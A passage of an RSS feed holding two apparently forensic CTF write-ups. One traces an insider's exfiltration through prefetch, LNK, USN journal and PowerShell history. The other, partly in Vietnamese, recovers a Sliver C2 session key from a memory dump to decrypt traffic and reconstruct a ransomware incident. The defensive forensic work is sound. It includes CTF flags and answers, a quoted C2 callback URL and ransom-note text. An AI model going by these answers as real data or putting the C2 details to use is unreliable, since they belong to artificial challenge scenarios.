   Machine ID:  win-tssjnps56jv
   MAC Address: 98:fa:9b:4c:20:39
   MAC Vendor:  LCFC
   Creation:    2025-01-16 12:10:59

   Volume Droid:       00000000-0000-0000-0000-000000000000
   Volume Droid Birth: 00000000-0000-0000-0000-000000000000
   File Droid:         f2801588-d402-11ef-93d4-98fa9b4c2039
   File Droid birth:   f2801588-d402-11ef-93d4-98fa9b4c2039

&amp;gt;&amp;gt; Property store data block (Format: GUID\ID Description ==&amp;gt; Value)
   9f4c2855-9f79-4b39-a8d0-e1d42de1d5f3\7      App User Model Is DestList Link     ==&amp;gt; True
   446d16b1-8dad-4870-a748-402ea43d788c\104    Volume Id                           ==&amp;gt; Unmapped GUID: de87ecc0-d706-11ef-beb9-000c29b3a97f


---------- Processed D:\CTFchall\tools\Critical Data TECH THM.lnk in 0.20393990 seconds ----------

&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;Answer : Critical Data TECH THM
Answer : Exfiltration Plan&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Question 8 :The external entity didn&apos;t fully trust Liam for the exfiltration so they asked him to execute file_uploader.exe, through the instructions in PDF. When was this file last executed and how many times was it executed? (YYYY-MM-DD HH:MM:SS, number of execution times)&lt;/h2&gt;
&lt;p&gt;To answer the question &quot;When was file_uploader.exe last executed and how many times was it executed?&quot;, you’ll need to analyze artifacts that record program executions on Windows systems. Here are the most relevant forensic sources to examine: Prefetch
I found FILE_UPLOADER.EXE.pf and used PECmd.exe tool for analysis&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Command line: -f C:\Users\Administrator\Documents\New Folder\Liam&apos;s Disk\Export\FILE_UPLOADER.EXE-FCDB89C7.pf

Keywords: temp, tmp

Processing C:\Users\Administrator\Documents\New Folder\Liam&apos;s Disk\Export\FILE_UPLOADER.EXE-FCDB89C7.pf

Created on: 2025-04-23 09:57:59
Modified on: 2025-04-23 09:57:59
Last accessed on: 2025-04-23 09:57:59

Executable name: FILE_UPLOADER.EXE
Hash: FCDB89C7
File size (bytes): 70,730
Version: Windows 10 or Windows 11

Run count: 2
Last run: 2025-01-29 11:26:09
Other run times: 2025-01-29 11:26:11

Volume information:

#0: Name: \VOLUME{01db6b1f7da8db1d-f47db76f} Serial: F47DB76F Created: 2025-01-20 09:41:33 Directories: 11 File references: 39

Directories referenced: 11

00: \VOLUME{01db6b1f7da8db1d-f47db76f}\$EXTEND
01: \VOLUME{01db6b1f7da8db1d-f47db76f}\USERS
02: \VOLUME{01db6b1f7da8db1d-f47db76f}\USERS\ADMINISTRATOR
03: \VOLUME{01db6b1f7da8db1d-f47db76f}\USERS\ADMINISTRATOR\APPDATA
04: \VOLUME{01db6b1f7da8db1d-f47db76f}\USERS\ADMINISTRATOR\APPDATA\LOCAL
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;Answer: 2025-01-29 11:26:09,2&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Question 9:Liam received a hidden flag inside a file (in the zip folder) from the external entity helping him. What was that?&lt;/h2&gt;
&lt;p&gt;Checking file confidential at Question 6 for answering It&apos;ll locate in comment of picture we can see it by using exiftool tool&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;exiftool confidential  
ExifTool Version Number         : 13.10
File Name                       : confidential
Directory                       : .
File Size                       : 706 kB
File Modification Date/Time     : 2025:04:23 00:49:03-04:00
File Access Date/Time           : 2025:04:23 00:49:03-04:00
File Inode Change Date/Time     : 2025:04:23 00:49:03-04:00
File Permissions                : -rw-rw-r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 800
Image Height                    : 600
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Pixels Per Unit X               : 13780
Pixels Per Unit Y               : 13780
Pixel Units                     : meters
Modify Date                     : 2020:08:24 19:50:21
Comment                         : FLAGT{THM_TECH_DATA}
Image Size                      : 800x600
Megapixels                      : 0.480
                                                  
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;Answer : FLAGT{THM_TECH_DATA}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Question 10: It seems like Liam caused one last damage before leaving. When did Liam delete &quot;Tax Records.docx&quot;? (YYYY-MM-DD HH:MM:SS)&lt;/h2&gt;
&lt;p&gt;I dumped $LogFile and $UsnJrnl Log to analysis activity of attacker about deleted, created, modified files&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SkeMev4L1ee.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0x00CF8A40|128574|128574||244969960|244969935|DeleteIndexEntryAllocation|AddIndexEntryAllocation|0|Tax Records.docx|$INDEX_ALLOCATION:$I30|;MftRef=132649;MftSeqNo=1;See LogFile_INDX_I30.csv|||||||2025-01-17 12:47:20.0000000|2025-01-17 12:47:19.7822537|2025-01-20 08:17:47.9082253|2025-01-20 08:17:47.9082253|||||||||||||16384|15445|archive|WIN32|||||||||0|0|120|0x00000000|1|0x00000068|0x0003|0x0B80|0x0001|1616|0x0000|0x00000000|0x0024E2E3|0|0|0
0x00CF9050|132649|||244969994|244969960|DeallocateFileRecordSegment|InitializeFileRecordSegment|0|Tax Records.docx||||||||||||||||||||||||||||||||||||||0|24|0x00000000|1|0x00000068|0x0002|0x0018|0x0001|0|0x0002|0x0000818A|0x000C818A|-1|0|0
0x00CF91B8|90831|90831||244970039|244970020|UpdateNonResidentValue|Noop|1792|Tax Records.docx|$DATA:$J|;$UsnJrnl|Tax Records.docx|132649|128574|2025-01-29 11:29:02.6974651|FILE_DELETE+CLOSE|7612160||||||||||||||||||||||||||||||96|0|0x00000000|1|0x00000068|0x0004|0x0068|0x0001|0|0x0000|0x00000742|0x000181BD|0|0|0
0x00CF8E78|128574|128574||244969935|244969923|DeleteIndexEntryAllocation|AddIndexEntryAllocation|0|TAXREC~1.DOC|$INDEX_ALLOCATION:$I30|;MftRef=132649;MftSeqNo=1;See LogFile_INDX_I30.csv|||||||2025-01-17 12:47:20.0000000|2025-01-17 12:47:19.7822537|2025-01-20 08:17:47.9082253|2025-01-20 08:17:47.9082253|||||||||||||16384|15445|archive|DOS|||||||||0|0|112|0x00000000|1|0x00000068|0x0002|0x0B80|0x0001|1736|0x0000|0x00000000|0x0024E2E3|0|0|0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;As a Result I conclude that :
&lt;strong&gt;Key Events:
$INDEX_ALLOCATION (Directory Entry Deletion)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;DeleteIndexEntryAllocation → Tax Records.docx
Timestamp: 2025-01-17 12:47:20
This indicates the file was removed from the directory listing (first sign of deletion).&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;$MFT Entry Deallocation&lt;/strong&gt;
DeallocateFileRecordSegment → Tax Records.docx
Timestamp not directly provided, but occurs &lt;em&gt;after&lt;/em&gt; the DeleteIndexEntryAllocation.
The file record is marked as unallocated in the Master File Table (MFT), further confirming deletion.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;$UsnJrnl Log (Final Deletion Confirmation)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;FILE_DELETE+CLOSE
File: Tax Records.docx
Timestamp: 2025-01-29 11:29:02.6974651
This shows that the file was definitively deleted and closed at this later timestamp, logged by the $UsnJrnl.&lt;/p&gt;
&lt;p&gt;Forensic Interpretation:
Initial deletion action (removal from directory):
2025-01-17 12:47:20&lt;/p&gt;
&lt;p&gt;Confirmed final deletion (via $UsnJrnl):
2025-01-29 11:29:02&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Answer : 2025-01-29 11:29:02&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Question 12: Which social media site did Liam search for using his web browser? Likely to avoid suspicion, thinking somebody was watching him. (Full URL)&lt;/h2&gt;
&lt;p&gt;Checking it in WebCategory AutoPsy&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Answer: http://www.facebook.com&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Question 13 : What is the PowerShell command Liam executed as per the plan?&lt;/h2&gt;
&lt;p&gt;As per plan attack in pdf file&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. Connect to your Personal Hotspot.
2. Copy the critical files to the folder we created specifically for this data.
3. Execute the file_uploader.exe.
4. Get all the Network Shares.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And in history powershell in C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PsReadline\Console History.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters&quot; /v EnablePrefetcher /t REG_DWORD /d 3 /f
reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Prefetcher&quot; /v MaxPrefetchFiles /t REG_DWORD /d 8192 /f
Enable-MMAgent –OperationAPI`

Enable-MMAgent –OperationAPI
net start sysmain
Get-WmiObject -Class Win32_Share | Select-Object Name, Path
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;Answer: Get-WmiObject -Class Win32_Share | Select-Object Name, Path&lt;/p&gt;
&lt;/blockquote&gt;
</content:encoded></item><item><title>Sliver-C2 framework</title><link>https://bruning-frighting.github.io/KAiZ3nThong/posts/sliver/</link><guid isPermaLink="true">https://bruning-frighting.github.io/KAiZ3nThong/posts/sliver/</guid><description>Read more about Sliver Framework C2 detection</description><pubDate>Thu, 20 Jun 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;Sliver-C2 framework&lt;/h1&gt;
&lt;p&gt;Nhận chall với 2 file DMP và pcap
check signature thì file DMP là file minidump&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;└─$ ./Quesion
[1] What is the name of the framework used? (use lowercase letters)  sliver
Correct! Moving to the next question.
[2] What is the IP of the attacker&apos;s C2 server?  192.168.1.108
Correct! Moving to the next question.
[3] What is the session key of the C2 used to encrypt data during communication?  11f4e5b7e21870c8f44143464b1b80b7b03f9852d782ef6d90b81f626f291401
Correct! Moving to the next question.
[4] Two files were deleted. What are their names? (in alphabetical order, format: abc-def)  781724.png-secret.txt
Correct! Moving to the next question.
[5] A screenshot from the victim&apos;s machine was sent. What application is the victim using? (use lowercase letters)  notepad
Correct! Moving to the next question.
[6] An executable file was uploaded from the server to the victim&apos;s machine. What is the name of the file?   temp.exe
Correct! Moving to the next question.
[7] What is the extension of the encrypted file changed to by the executable file in question 6?   enc
Correct! Moving to the next question.
[8] What is the path where the message left by the hacker is located?   C:\Users\Administrator\Downloads
Correct! Moving to the next question.
You Winnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn
Flag is Flag{Yeu_em_la_dieu_anh_khong_the_ngo_1a1e70ba17ae145c73c2f403d29304b97ede240987e8850d9643924dc05e00d2}
Press Enter to exit...

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Question 1&lt;/strong&gt;
ta sử dụng Windbg để debug file minidump
&lt;img src=&quot;https://hackmd.io/_uploads/r1yhusor1x.png&quot; alt=&quot;image&quot; /&gt;
chương trình đã bị crash tại process AMUSED_MILKSHAKE
tiến hành dump process đó ra kiểm tra với&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HyVNYioSkg.png&quot; alt=&quot;image&quot; /&gt;
đây là thông tin của module
dùng lệnh &lt;strong&gt;.writemem &apos;%USER PROFILE%\outputfolder...&apos; start end&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;.writemem C:\Users\Username\Downloads\AMUSED_MILKSHAKE.bin 00920000 01a11000
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Khi có file ta đưa vào virustotal để quick scan
&lt;img src=&quot;https://hackmd.io/_uploads/BJOE5ojSkl.png&quot; alt=&quot;image&quot; /&gt;
ta có thể thấy đây là một trojan sliver
search google sliver framework
&lt;img src=&quot;https://hackmd.io/_uploads/HyQq5ooSye.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Đáp án 1 :&lt;/strong&gt; sliver&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Question2:&lt;/strong&gt;
Check file pcap ta thấy được các gói http nghi vấn đến từ 192.169.1.108 chứa các chuỗi hex, base64, words lạ
&lt;img src=&quot;https://hackmd.io/_uploads/B1hZojoryx.png&quot; alt=&quot;image&quot; /&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/SJM7iisS1x.png&quot; alt=&quot;image&quot; /&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/rkSVjsjBkg.png&quot; alt=&quot;image&quot; /&gt;
&lt;strong&gt;Đáp án 2 :&lt;/strong&gt; 192.168.1.108&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Question3:&lt;/strong&gt;
sau khi đã biết được attacker sử dụng Sliver-C2 framework
tìm các bài blog có liên quan
https://www.immersivelabs.com/blog/detecting-and-decrypting-sliver-c2-a-threat-hunters-guide&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Hy_Z2osS1g.png&quot; alt=&quot;image&quot; /&gt;
trong blog có nói rõ về cách extract session key từ memory dump
session key dùng để decrypt các payload trên network traffic
&lt;img src=&quot;https://hackmd.io/_uploads/HkX8hosBke.png&quot; alt=&quot;image&quot; /&gt;
Không may mắn là ta phải tìm key theo cách thủ công với Hex
và thu nhỏ phạm vi tìm kiếm với Pattern&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Filter:
- Pattern : 00 00 [32 bytes key] ?? ?? ?? 00 C0 00 00
- Trong bài viết nói chuỗi sha256 key sẽ hiếm khi có 3 byte null liền kề trong 10 million SHA256 random được tạo ra
(bỏ đi các sha256 filter nếu có 3 byte null liền kề)
- Và cũng nói là sẽ hiếm khi có mã sha256 có byte null ở cuối hash
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;với các thông tin này ta viết script
chuyển file DMP =&amp;gt; sang dạng hex&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def print_hex(filename):
    with open(filename, &apos;rb&apos;) as file:
        hex_data = file.read()
        return hex_data.hex()

hex_data=print_hex(&quot;AMUSED_MILKSHAKE.DMP&quot;)
f=open(&quot;hex.txt&quot;,&quot;w&quot;)
f.write(hex_data)
f.close()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Lọc pattern&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ cat hex.txt | grep -oE &apos;0000([a-fA-F0-9]{70})00c00000&apos; &amp;gt; pattern.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;f=open(&quot;pattern.txt&quot;,&quot;r&quot;)
data=f.readlines()
f.close()
possible_keys = []
for i in data:
    possible_keys.append(i[4:68])
filter_keys = []
for i in possible_keys:
    if not(&quot;000000&quot;) in i:
    	if not ( i[62:] == &quot;00&quot; ):
    		filter_keys.append(i)
for i in filter_keys:
	print(f&quot;Possible key : {i}&quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;output&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;└─$ python b.py
Possible key : 200810200810200a10200a302009102008902000002004002004402000002001
Possible key : 6d653a20696e76616c6964206475726174696f6e206a2de3cbe5bb8fa9c2b297
Possible key : 4e4f5f50524f58594e4f5f50524f58596e6f5f70726f78796e6f5f70726f7879
Possible key : 4e4f5f50524f58594e4f5f50524f58596e6f5f70726f78796e6f5f70726f7879
Possible key : 11f4e5b7e21870c8f44143464b1b80b7b03f9852d782ef6d90b81f626f291401
Possible key : 00000f4050cffffffffff850a00000a0c0a0000ee2c18e2620300f5050bfffff
Possible key : eb3a837d102e750644396d387430488b542470488bcde891fbffff8bf085c074
Possible key : a3320000d42507001a230a0009060a0615011b0009f007e00570046003300250
Possible key : 004c8d442420488d5424288b0883e1f8897c2428894c2420488d4c2420e8043f
Possible key : 644710001001000019260a0014011b000df00be009d007c00570046003500230
Possible key : 0ff004585ed750f498b06f6c3027405668910eb02881033c0eb1de8e142fcff3
Possible key : 009941f7f88945ac448bf040f6c7010f85f70100004c8b45e84d85c00f84ea01
Possible key : 0005bc3cccccccccccccccc40534881ecd00c0000488b05e85e0b004833c4488
Possible key : 50500300e5500300804215001922080010011b0009f007e00570046003500230

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Đáp án 3 : 11f4e5b7e21870c8f44143464b1b80b7b03f9852d782ef6d90b81f626f291401&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Question 4:&lt;/strong&gt;
Sau khi có được session key ta tiến hành xử lý payload trong file pcap với tool được đề cập trong blog&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://github.com/Immersive-Labs-Sec/SliverC2-Forensics/tree/main
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;sử dụng
silver-pcap-parse.py để lấy payload ra
do không có dấu hiệu payload ở DNS nên ta chỉ filter cho http&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ python sliver_pcap_parser.py --pcap ~/Desktop/extract.pcapng --filter http --domain_name 192.168.1.108

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;xong sử dụng sliver_decrypt.py cùng với key session để decrypt file http_message.json&lt;/p&gt;
&lt;p&gt;như có vẻ không hoạt động tốt
sau vài giờ kiểm tra tôi biết vấn đề nằm ở các định dạng file http-message.json&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rkZ3F2sBJg.png&quot; alt=&quot;image&quot; /&gt;
ta thấy các định dạng đã được đưa về hex không đúng như định dạng trong script decrypt
ở chỗ words tôi bôi đỏ
&lt;img src=&quot;https://hackmd.io/_uploads/rkgMqhoHye.png&quot; alt=&quot;image&quot; /&gt;
đúng định dạng phải như này
và gzip-b64 tôi sẽ đưa về b64 để dễ cho script decrypt hoạt động tốt tránh lỗi trong việc xử lý gunzip
&lt;img src=&quot;https://hackmd.io/_uploads/ry0U93jryx.png&quot; alt=&quot;image&quot; /&gt;
lúc này tôi sẽ sử dụng file http-message.json
&lt;img src=&quot;https://hackmd.io/_uploads/SJIj5hoHJx.png&quot; alt=&quot;image&quot; /&gt;
làm tương tự với các process trong file http-message.json
sau khi đã sửa file http-message ta decrypt được&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;─$ python sliver_decrypt.py --key 11f4e5b7e21870c8f44143464b1b80b7b03f9852d782ef6d90b81f626f291401 --transport http --file_path fixed_http-sessions.json &amp;gt; file_payload

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ta có được payload
&lt;img src=&quot;https://hackmd.io/_uploads/B1g2nhjrkg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;sau xong ta lấy tất cả hex của message data đem đi decode probobuf
https://protobuf-decoder.netlify.app/&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BkOPp3jSye.png&quot; alt=&quot;image&quot; /&gt;
file payload chưa được decode protobuf
bây giờ vào link trên để decode
khi decode ta thấy đây là một cuộc tấn công ransomware
folder dc nhắm tới C:\Users\Administrator\Downloads&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BJ1EA2iryx.png&quot; alt=&quot;image&quot; /&gt;
khi chưa encrypt ransomware
các file&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\Users\Administrator\Downloads
│
├── 0106_hinh-nen-4k-may-tinh6.jpg -rw-rw-rw-
├── 0106_hinh-nen-may-tinh-full-hd88.jpg -rw-rw-rw-
├── 0106_hinh-nen-may-tinh-full-hd88.jpg -rw-rw-rw-
├── 1330526.png -rw-rw-rw-
├── 1337222.jpeg -rw-rw-rw-
├── 404-error-glitch-3840x2160-18144.jpg -rw-rw-rw-
├── 575156.jpg -rw-rw-rw-
├── 641968.jpg -rw-rw-rw-
├── 781724.png -rw-rw-rw-
├── _linkvortex.htb (folder) drwxrwxrwx
├── _youtube.com (folder) drwxrwxrwx
├── a.sh -rw-rw-rw-
├── desktop.ini -rw-rw-rw-
├── mini_flag.txt -rw-rw-rw-
├── secret.txt -rw-rw-rw-
├── vcruntime140 (folder) drwxrwxrwx
└── vcruntime140.zip -rw-rw-rw-

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;khi đã encrypt&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\Users\Administrator\Downloads
│
├── 0106_hinh-nen-4k-may-tinh61.jpg.enc -rw-rw-rw-
├── 0106_hinh-nen-may-tinh-full-hd88.jpg.enc -rw-rw-rw-
├── 0106_hinh-nen-may-tinh-full-hd88.jpg.enc -rw-rw-rw-
├── 1330526.png.enc -rw-rw-rw-
├── 1337222.jpeg.enc -rw-rw-rw-
├── 404-error-glitch-3840x2160-18144.jpg.enc -rw-rw-rw-
├── 575156.jpg.enc -rw-rw-rw-
├── 641968.jpg.enc -rw-rw-rw-
├── YOU HAVE BEEN HACKED. IF YOU WANT TO RECOVER YOUR DATA, PLEASE CONTACT ME VIA DISCORD tr0n9_t4m (folder) drwxrwxrwx
├── _linkvortex.htb (folder) drwxrwxrwx
├── _youtube.com (folder) drwxrwxrwx
├── a.sh.enc -rw-rw-rw-
├── desktop.ini.enc -rw-rw-rw-
├── mini_flag.txt.enc -rw-rw-rw-
├── temp.exe -rw-rw-rw-
├── temp.exe.enc -rw-rw-rw-
├── temp_wallpaper.png -rw-rw-rw-
├── vcruntime140 (folder) drwxrwxrwx
└── vcruntime140.zip.enc -rw-rw-rw-

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ta thấy đã bị xóa 2 file 781724.png-secret.txt
** đáp án câu 4: 781724.png-secret.txt**&lt;/p&gt;
&lt;p&gt;Question 5 : có file sample.png&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SJt1WpiHye.png&quot; alt=&quot;image&quot; /&gt;
ta thấy dưới có payload được attacker gửi về server thông qua lệnh POST với request url http://192.168.1.108/oauth2/api/namespaces/oauth/oauth2/oauth2/samples.php?s=94728974
&lt;img src=&quot;https://hackmd.io/_uploads/HkB3Waorye.png&quot; alt=&quot;image&quot; /&gt;
&lt;strong&gt;đáp án : notepad&lt;/strong&gt;
Question 6 : temp.exe
Question 7: enc
Question 8 : YOU HAVE BEEN HACKED. IF YOU WANT TO RECOVER YOUR DATA, PLEASE CONTACT ME VIA DISCORD tr0n9_t4m (folder) drwxrwxrwx
** Đáp án : C:\Users\Administrator\Downloads**&lt;/p&gt;
</content:encoded></item></channel></rss>